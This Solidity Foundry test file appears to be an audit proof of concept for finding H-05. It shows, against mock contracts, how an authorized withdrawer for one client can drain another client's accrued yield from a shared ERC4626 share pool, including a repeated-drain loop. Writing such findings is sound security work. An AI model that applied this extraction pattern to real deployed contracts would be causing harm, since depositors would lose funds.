// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/concreteYieldStrategies/ERC4626MarketYieldStrategy.sol";
import "../src/mocks/MockERC20.sol";
import "./mocks/MockERC4626Vault.sol";
import "./mocks/MockAMMAdapter.sol";

/**
 * @title PoC_H03_CrossClientSurplusDrainage
 * @notice Proof of concept for finding H-05.
 *
 * @dev Vulnerability Location: src/concreteYieldStrategies/ERC4626MarketYieldStrategy.sol:411-451
 *
 * VULNERABILITY SUMMARY:
 * `_withdrawFrom` is called by an authorized withdrawer to pull a client's accrued
 * surplus (yield above principal). The function:
 *   1. Calculates `principal = clientBalances[token][client]`
 *   2. Calculates `totalBalance = totalBalanceOf(token, client)` -- a pro-rata view of
 *      the SHARED vault share pool
 *   3. Asserts `amount <= surplus`, where `surplus = totalBalance - principal`
 *   4. Sells `convertToShares(amount)` shares from the SHARED vault share pool via the AMM
 *   5. Transfers underlying to the chosen recipient
 *   6. Does NOT modify `clientBalances` or `totalDeposited`
 *
 * The bug: the share pool is shared across all clients. Selling shares for client A's
 * surplus reduces the pool, which reduces ALL OTHER CLIENTS' totalBalanceOf pro-rata.
 * Since principal accounting is unchanged, the loss falls entirely on the other clients'
 * surplus -- silently transferring their yield to client A's chosen recipient.
 *
 * MATH WALKTHROUGH (matches the assertions below):
 *   - clientA and clientB each deposit 100. totalDeposited = 200, vault has 200 shares.
 *   - Vault price doubles via simulateYield(200): convertToAssets(200) = 400.
 *   - clientA.totalBalance = 400 * 100/200 = 200. clientA.surplus = 100.
 *   - clientB.totalBalance = 400 * 100/200 = 200. clientB.surplus = 100.
 *   - withdrawFrom(token, clientA, 100, recipient) is called by the authorized withdrawer.
 *   - Shares sold = convertToShares(100) = 100 * 200/400 = 50. AMM gives back 100 underlying.
 *   - vault.balanceOf(strategy) = 150. convertToAssets(150) = 300.
 *   - clientA.totalBalance = 300 * 100/200 = 150. clientA.surplus = 50.
 *   - clientB.totalBalance = 300 * 100/200 = 150. clientB.surplus = 50.
 *
 * Net effect: extracting "clientA's 100 surplus" pulled 100 underlying out of the pool,
 * but only 50 of that came from clientA's own surplus -- the remaining 50 came directly
 * out of clientB's surplus, even though clientB's withdrawer never authorized anything.
 *
 * SEVERITY: HIGH -- one client's authorized withdrawer can drain another client's
 * accrued yield without consent.
 */
contract PoC_H03_CrossClientSurplusDrainage is Test {
    ERC4626MarketYieldStrategy strategy;
    MockERC20 underlyingToken;
    MockERC4626Vault erc4626Vault;
    MockAMMAdapter ammAdapter;

    address owner = address(0x1234);
    address depositorClient = address(0x5678); // authorized "client" that calls deposit on behalf of recipients
    address withdrawer = address(0xABCD); // authorized withdrawer (can call withdrawFrom)

    // The two "clients" from the finding's perspective: distinct balance-holder addresses
    // whose principal/surplus is tracked independently in clientBalances mapping.
    address clientA = address(0xA);
    address clientB = address(0xB);

    // Recipient that clientA's withdrawer will direct surplus to.
    address recipient = address(0xCAFE);

    uint256 constant DEPOSIT_AMOUNT = 100e18;
    uint256 constant YIELD_AMOUNT = 200e18; // doubles per-share value (see _seedAmm())
    uint256 constant DEPOSITOR_FUNDS = 10_000e18;

    // The AMM is seeded with EXACTLY enough vault shares to cover the planned deposits
    // (so the strategy ends up holding the entire vault share supply after deposits and
    // simulateYield() acts on a clean per-share denominator). The AMM then "redeems"
    // shares back into underlying via the strategy's withdrawFrom path.
    uint256 constant AMM_VAULT_SHARE_RESERVES = 200e18; // 100 (clientA) + 100 (clientB)
    uint256 constant AMM_UNDERLYING_RESERVES = 10_000e18; // ample buffer for withdraws

    function setUp() public {
        // Deploy mock tokens
        underlyingToken = new MockERC20("Underlying", "UND", 18);

        // Deploy mock ERC4626 vault
        erc4626Vault = new MockERC4626Vault("Vault Shares", "vUND", address(underlyingToken));

        // Deploy mock AMM adapter
        ammAdapter = new MockAMMAdapter();

        // Deploy the strategy
        vm.prank(owner);
        strategy = new ERC4626MarketYieldStrategy(
            owner, address(underlyingToken), address(erc4626Vault), address(ammAdapter)
        );

        // 1:1 exchange rates
        ammAdapter.setExchangeRate(address(underlyingToken), address(erc4626Vault), 1e18);
        ammAdapter.setExchangeRate(address(erc4626Vault), address(underlyingToken), 1e18);

        // Mint underlying tokens for the depositor
        underlyingToken.mint(depositorClient, DEPOSITOR_FUNDS);

        // Seed the AMM with the EXACT amount of vault shares needed (no more), so that
        // after both clients deposit, the strategy holds 100% of the vault's share
        // supply. This keeps the convertToAssets/convertToShares math clean and lets
        // simulateYield() actually double per-share value as the math walkthrough
        // describes (rather than being diluted by an enormous AMM share inventory).
        underlyingToken.mint(address(this), AMM_VAULT_SHARE_RESERVES);
        underlyingToken.approve(address(erc4626Vault), AMM_VAULT_SHARE_RESERVES);
        erc4626Vault.deposit(AMM_VAULT_SHARE_RESERVES, address(ammAdapter));

        // Also fund the AMM with underlying tokens for withdrawal swaps
        underlyingToken.mint(address(ammAdapter), AMM_UNDERLYING_RESERVES);

        // Authorize the depositor client and the withdrawer
        vm.startPrank(owner);
        strategy.setClient(depositorClient, true);
        strategy.setWithdrawer(withdrawer, true);
        // 1% slippage tolerance, matching unit test defaults
        strategy.setSlippageTolerance(100);
        vm.stopPrank();

        // Allow the strategy to pull tokens from the depositor
        vm.prank(depositorClient);
        underlyingToken.approve(address(strategy), type(uint256).max);
    }

    /// @notice Helper: deposit `amount` underlying on behalf of `who` (the balance-holder).
    function _depositFor(address who, uint256 amount) internal {
        vm.prank(depositorClient);
        strategy.deposit(address(underlyingToken), amount, who);
    }

    /// @notice Helper: read surplus for a client.
    function _surplusOf(address who) internal view returns (uint256) {
        uint256 principal = strategy.principalOf(address(underlyingToken), who);
        uint256 total = strategy.totalBalanceOf(address(underlyingToken), who);
        return total > principal ? total - principal : 0;
    }

    // ============================================================
    // PRIMARY POC: extracting clientA's surplus reduces clientB's
    // ============================================================
    function test_ExtractingClientASurplusReducesClientBSurplus() public {
        // ----- Step 1: clientA and clientB each deposit 100 underlying -----
        _depositFor(clientA, DEPOSIT_AMOUNT);
        _depositFor(clientB, DEPOSIT_AMOUNT);

        // Sanity: principals are tracked independently and totalDeposited is the sum.
        assertEq(strategy.principalOf(address(underlyingToken), clientA), DEPOSIT_AMOUNT, "A principal");
        assertEq(strategy.principalOf(address(underlyingToken), clientB), DEPOSIT_AMOUNT, "B principal");
        assertEq(strategy.getTotalDeposited(address(underlyingToken)), 2 * DEPOSIT_AMOUNT, "totalDeposited");

        // ----- Step 2: simulate yield by doubling the vault price -----
        // Vault has 200 shares (1:1 with deposit), so simulateYield(200) makes
        // convertToAssets(200) == 400, doubling each share's value.
        erc4626Vault.simulateYield(YIELD_AMOUNT);

        // The AMM tracks the vault's per-share value (otherwise the strategy's
        // slippage check, which compares against vault.convertToAssets, would fail).
        // After the yield doubles per-share value, 1 vault share = 2 underlying.
        ammAdapter.setExchangeRate(address(erc4626Vault), address(underlyingToken), 2e18);

        // Pre-extraction state: each client has 200 totalBalance and 100 surplus.
        uint256 aTotalBefore = strategy.totalBalanceOf(address(underlyingToken), clientA);
        uint256 bTotalBefore = strategy.totalBalanceOf(address(underlyingToken), clientB);
        uint256 aSurplusBefore = _surplusOf(clientA);
        uint256 bSurplusBefore = _surplusOf(clientB);

        assertEq(aTotalBefore, 200e18, "A.totalBalance pre");
        assertEq(bTotalBefore, 200e18, "B.totalBalance pre");
        assertEq(aSurplusBefore, 100e18, "A.surplus pre");
        assertEq(bSurplusBefore, 100e18, "B.surplus pre");

        emit log_named_uint("[pre] clientA.totalBalance", aTotalBefore);
        emit log_named_uint("[pre] clientA.surplus     ", aSurplusBefore);
        emit log_named_uint("[pre] clientB.totalBalance", bTotalBefore);
        emit log_named_uint("[pre] clientB.surplus     ", bSurplusBefore);

        uint256 recipientBefore = underlyingToken.balanceOf(recipient);

        // ----- Step 3: authorized withdrawer extracts ALL of clientA's surplus -----
        // The protocol believes this only touches clientA's yield. In reality, the
        // shares it sells come out of the SHARED pool, dragging down clientB's
        // pro-rata totalBalance as well.
        vm.prank(withdrawer);
        strategy.withdrawFrom(address(underlyingToken), clientA, aSurplusBefore, recipient);

        // ----- Step 4: recipient received 100 underlying -----
        uint256 recipientAfter = underlyingToken.balanceOf(recipient);
        assertEq(recipientAfter - recipientBefore, 100e18, "recipient received 100 underlying");

        // ----- Step 5: principals are unchanged for both clients -----
        assertEq(
            strategy.principalOf(address(underlyingToken), clientA),
            DEPOSIT_AMOUNT,
            "A.principal unchanged"
        );
        assertEq(
            strategy.principalOf(address(underlyingToken), clientB),
            DEPOSIT_AMOUNT,
            "B.principal unchanged"
        );

        // ----- Step 6: SMOKING GUN -- clientB's totalBalance silently dropped -----
        uint256 aTotalAfter = strategy.totalBalanceOf(address(underlyingToken), clientA);
        uint256 bTotalAfter = strategy.totalBalanceOf(address(underlyingToken), clientB);
        uint256 aSurplusAfter = _surplusOf(clientA);
        uint256 bSurplusAfter = _surplusOf(clientB);

        emit log_named_uint("[post] clientA.totalBalance", aTotalAfter);
        emit log_named_uint("[post] clientA.surplus     ", aSurplusAfter);
        emit log_named_uint("[post] clientB.totalBalance", bTotalAfter);
        emit log_named_uint("[post] clientB.surplus     ", bSurplusAfter);

        // clientB lost surplus even though clientB's withdrawer never authorized anything.
        assertLt(bTotalAfter, bTotalBefore, "B.totalBalance must decrease");
        assertLt(bSurplusAfter, bSurplusBefore, "B.surplus must decrease");

        // The math: pool dropped from 400 -> 300, so each client's pro-rata is 150.
        assertEq(aTotalAfter, 150e18, "A.totalBalance == 150 (per math)");
        assertEq(bTotalAfter, 150e18, "B.totalBalance == 150 (per math)");
        assertEq(aSurplusAfter, 50e18, "A.surplus == 50 (per math)");
        assertEq(bSurplusAfter, 50e18, "B.surplus == 50 (per math)");

        // The damage to clientB exactly equals the "stolen" portion: 50e18.
        // The withdrawer extracted 100, but clientA only "owned" 50 of it; the
        // other 50 was clientB's surplus.
        assertEq(bSurplusBefore - bSurplusAfter, 50e18, "B silently lost exactly 50e18 of yield");

        emit log_string("");
        emit log_string("=== H-05 CONFIRMED: clientA's withdrawer drained 50e18 of clientB's surplus ===");
    }

    // ============================================================
    // SECONDARY POC: cumulative draining via repeated calls
    // ============================================================
    /// @notice Show that a malicious or negligent withdrawer for clientA can keep
    ///         calling withdrawFrom and continuously bleed clientB. Each round,
    ///         clientA's "surplus" view recovers (because clientB's share is
    ///         absorbed pro-rata), and the withdrawer can extract again.
    function test_RepeatedExtractionsDrainAllOfClientB() public {
        // Same setup as the primary PoC.
        _depositFor(clientA, DEPOSIT_AMOUNT);
        _depositFor(clientB, DEPOSIT_AMOUNT);
        erc4626Vault.simulateYield(YIELD_AMOUNT);

        // After yield, vault per-share value = 2 underlying. The AMM rate must
        // track that or the strategy's slippage check rejects every withdraw.
        // (totalAssets and totalSupply do not change as the strategy bleeds shares
        // -- only the AMM's share balance grows -- so this rate stays valid for
        // the entire loop below.)
        ammAdapter.setExchangeRate(address(erc4626Vault), address(underlyingToken), 2e18);

        uint256 bSurplusStart = _surplusOf(clientB);
        assertEq(bSurplusStart, 100e18, "B.surplus start");

        uint256 recipientStart = underlyingToken.balanceOf(recipient);

        // Repeatedly drain clientA's "available" surplus. clientA only ever
        // honestly earned 100e18 of yield, but the loop will pull more than
        // that out of the shared pool by sucking yield away from clientB.
        for (uint256 i = 0; i < 8; i++) {
            uint256 aSurplus = _surplusOf(clientA);
            if (aSurplus == 0) break;
            vm.prank(withdrawer);
            strategy.withdrawFrom(address(underlyingToken), clientA, aSurplus, recipient);
        }

        uint256 recipientEnd = underlyingToken.balanceOf(recipient);
        uint256 totalExtracted = recipientEnd - recipientStart;

        emit log_named_uint("total extracted to clientA's recipient", totalExtracted);
        emit log_named_uint("clientB.surplus after looped extraction", _surplusOf(clientB));
        emit log_named_uint("clientB.totalBalance after extraction  ", strategy.totalBalanceOf(address(underlyingToken), clientB));

        // Principals are still untouched.
        assertEq(strategy.principalOf(address(underlyingToken), clientA), DEPOSIT_AMOUNT, "A.principal still 100");
        assertEq(strategy.principalOf(address(underlyingToken), clientB), DEPOSIT_AMOUNT, "B.principal still 100");

        // clientA "owned" only 100e18 of yield, but the recipient received strictly more.
        assertGt(totalExtracted, 100e18, "withdrawer extracted MORE than clientA's honest yield share");

        // clientB's surplus has been drained well below its honest 100e18 starting value.
        uint256 bSurplusEnd = _surplusOf(clientB);
        assertLt(bSurplusEnd, bSurplusStart, "B.surplus dropped");

        // The "extra" extracted beyond clientA's honest 100e18 must have come from clientB.
        uint256 stolenFromB = totalExtracted - 100e18;
        emit log_named_uint("yield stolen from clientB", stolenFromB);
        assertGt(stolenFromB, 0, "non-zero yield was stolen from clientB");
        // And clientB's surplus loss is at least that amount.
        assertGe(bSurplusStart - bSurplusEnd, stolenFromB, "B's surplus loss covers the theft");

        emit log_string("");
        emit log_string("=== H-05 CUMULATIVE DRAIN CONFIRMED ===");
    }
}
